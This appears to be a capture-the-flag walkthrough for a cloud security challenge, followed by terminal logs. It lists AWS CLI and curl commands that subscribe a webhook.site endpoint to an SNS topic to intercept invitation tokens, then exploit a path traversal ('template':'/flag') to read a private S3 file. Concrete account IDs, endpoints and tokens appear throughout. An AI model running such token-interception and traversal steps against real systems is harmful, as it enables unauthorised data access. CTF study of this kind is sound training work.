Based on the source code and the public writeup, the intended solve path is:

| Step | Goal                                                             | Result                           |
| ---- | ---------------------------------------------------------------- | -------------------------------- |
| 1    | Discover the AWS account ID hosting the challenge infrastructure | Required to interact with SNS    |
| 2    | Subscribe your own HTTPS endpoint to the SNS topic               | Receive invitation tokens        |
| 3    | Confirm the SNS subscription                                     | Topic becomes active             |
| 4    | Trigger invitation generation                                    | SNS sends a valid token          |
| 5    | Capture the token from the SNS notification                      | Bypass HMAC requirements         |
| 6    | Use the unvalidated API Gateway endpoint                         | Send arbitrary `template` values |
| 7    | Submit `template="/flag"`                                        | Trigger path traversal           |
| 8    | Retrieve generated card                                          | Flag appears inside card HTML    |

---

## Step 1 — Get Your Current Identity

```bash
aws sts get-caller-identity
```

Save:

```text
Account
Arn
UserId
```

---

## Step 2 — Find the Real AWS Account ID

The writeup indicates the account ID is intentionally hidden.

Check whether the ZIP contains:

```bash
grep -R "arn:aws:sns" .
grep -R "AWS::SNS" .
grep -R "TopicArn" .
grep -R "execute-api" .
grep -R "role/user-role" .
```

If not, use the provided enumeration method (`s3recon`) or inspect policies in the ZIP.

The goal is to discover:

```text
[TARGET_ACCOUNT_ID]
```

---

## Step 3 — Create a Webhook

Open:

```text
https://webhook.site
```

Copy the generated UUID.

Example:

```text
12345678-abcd-1234-abcd-123456789abc
```

---

## Step 4 — Subscribe to SNS

Use your base credentials:

```bash
aws sns subscribe \
  --topic-arn arn:aws:sns:us-east-1:<TARGET_ACCOUNT_ID>:BirthdayPartyInvites \
  --protocol https \
  --notification-endpoint "https://webhook.site/<UUID>?x=@cloudsecuritychampionship.com"
```

Expected:

```json
{
  "SubscriptionArn": "pending confirmation"
}
```

---

## Step 5 — Confirm the Subscription

Watch the webhook.site page.

SNS sends a confirmation message containing a URL.

Open the URL.

The subscription becomes active.

---

## Step 6 — Generate an Invitation

Submit an eligible email:

```bash
curl -X POST \
  https://<API_GATEWAY_1>/prod/generate \
  -H "Content-Type: application/json" \
  -d '{"email":"test@cloudsecuritychampionship.com"}'
```

Expected:

```json
{
  "status":"success"
}
```

---

## Step 7 — Capture the Token

Webhook.site should receive an SNS notification containing:

```json
{
  "token":"TIMESTAMP:SIGNATURE",
  "registration_url":"..."
}
```

Save the token.

---

## Step 8 — Abuse the Path Traversal

The vulnerable code is:

```python
os.path.join("templates", f"{template}.txt")
```

Using:

```json
{
  "template":"/flag"
}
```

causes:

```text
/flag.txt
```

to be read from the private bucket.

Send:

```bash
curl -X POST \
  https://<API_GATEWAY_2>/prod/register \
  -H "Content-Type: application/json" \
  -d '{
        "token":"<TOKEN>",
        "template":"/flag",
        "name":"attendee"
      }'
```

Expected:

```json
{
  "status":"success",
  "card_url":"https://wiz-birthday-s3-party.s3.amazonaws.com/cards/<uuid>.html"
}
```

---

## Step 9 — Retrieve the Flag

```bash
curl https://wiz-birthday-s3-party.s3.amazonaws.com/cards/<uuid>.html
```

The flag should be embedded in the generated birthday card.

### What I Need From You

Paste the output of:

```bash
find . -type f
```

from the ZIP directory (or the policy/template files), and I can tell you exactly how to discover:

* the target AWS account ID,
* the SNS topic ARN,
* and the second API Gateway URL.


aws sns subscribe \
  --topic-arn arn:aws:sns:us-east-1:092297851374:BirthdayPartyInvites \
  --protocol https \
  --notification-endpoint \
  "https://webhook.site/1f71823a-ab19-4758-a72b-85897a3df14d?x=@cloudsecuritychampionship.com"


  user@monthly-challenge:~$ curl -s -X POST \
'https://gzk65xqjn8.execute-api.us-east-1.amazonaws.com/prod/generate' \
-H 'Content-Type: application/json' \
-d '{"email":"test@cloudsecuritychampionship.com"}' | jq
{
  "status": "success",
  "message": "Invitation sent! Check your email."
}
user@monthly-challenge:~$ curl -s \
'https://happybirthday.cloudsecuritychampionship.com/register.html?token=1780734815:70a92bcf24966d96'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Complete Your Registration - S3 Birthday Party</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
<link rel="stylesheet" href="style.css">
</head>
<body>

<main class="page">
  <div class="content">
    <p class="eyebrow">You're invited</p>
    <h1>Complete Your<br>Registration</h1>
    <p class="subtitle">Enter your name to generate your personalized birthday card.</p>

    <form id="register-form" class="form">
      <div class="input-row">
        <input type="text" id="name-input" placeholder="Your name" required maxlength="50" autocomplete="off">
        <button type="submit" id="register-btn">
          <span class="btn-label">Get My Card</span>
          <svg class="btn-spinner" width="18" height="18" viewBox="0 0 18 18" fill="none">
            <circle cx="9" cy="9" r="7" stroke="currentColor" stroke-width="1.5" stroke-dasharray="36" stroke-dashoffset="9" stroke-linecap="round"/>
          </svg>
        </button>
      </div>
    </form>

    <div id="card-result" class="result hidden">
      <div class="result-bar">
        <span class="result-dot"></span>
        <span class="result-text">Your birthday card is ready!</span>
      </div>
      <div class="result-frame">
        <iframe id="card-iframe" title="Birthday Card"></iframe>
      </div>
      <a id="card-link" href="#" target="_blank" class="open-link">
        Open card
        <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M4.5 1.5H10.5V7.5M10 2L2 10" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
      </a>
    </div>

    <div id="card-error" class="error hidden">
      <span id="error-message"></span>
    </div>
  </div>

  <footer class="foot">
    <span>Amazon S3</span>
    <span class="foot-sep"></span>
    <span>20 years of simple storage</span>
  </footer>
</main>

<script>
const API_URL = "https://uact7tlegi.execute-api.us-east-1.amazonaws.com/prod/generate".replace("/generate", "/register");

const params = new URLSearchParams(window.location.search);
const token = params.get("token");

if (!token) {
  document.getElementById("register-form").classList.add("hidden");
  document.getElementById("card-error").classList.remove("hidden");
  document.getElementById("error-message").textContent = "Missing invitation token. Please use the link from your invitation email.";
}

const form = document.getElementById("register-form");
const nameInput = document.getElementById("name-input");
const registerBtn = document.getElementById("register-btn");
const resultDiv = document.getElementById("card-result");
const errorDiv = document.getElementById("card-error");
const errorMessage = document.getElementById("error-message");
const cardIframe = document.getElementById("card-iframe");
const cardLink = document.getElementById("card-link");

form.addEventListener("submit", async (e) => {
  e.preventDefault();
  const name = nameInput.value.trim();
  if (!name) return;

  registerBtn.classList.add("loading");
  registerBtn.disabled = true;
  resultDiv.classList.add("hidden");
  errorDiv.classList.add("hidden");

  try {
    const res = await fetch(API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ token, template: "default_balloon", name }),
    });

    const data = await res.json();

    if (!res.ok || data.status !== "success") {
      throw new Error(data.message || "Registration failed");
    }

    cardIframe.src = data.card_url;
    cardLink.href = data.card_url;
    resultDiv.classList.remove("hidden");
    form.classList.add("hidden");
    document.querySelector(".content").classList.add("has-result");
  } catch (err) {
    errorMessage.textContent = err.message || "Something went wrong.";
    errorDiv.classList.remove("hidden");
  } finally {
    registerBtn.classList.remove("loading");
    registerBtn.disabled = false;
  }
});
</script>
</body>
</html>
user@monthly-challenge:~$ 


aws lambda invoke --function-name arn:aws:lambda:us-east-1:370540381921:function:GenerateBirthdayCard --cli-binary raw-in-base64-out --payload '{"token":"1780735491:ab49b289027f3426", "template":"default_balloon", "name":"0x0z0n"}' default_template.json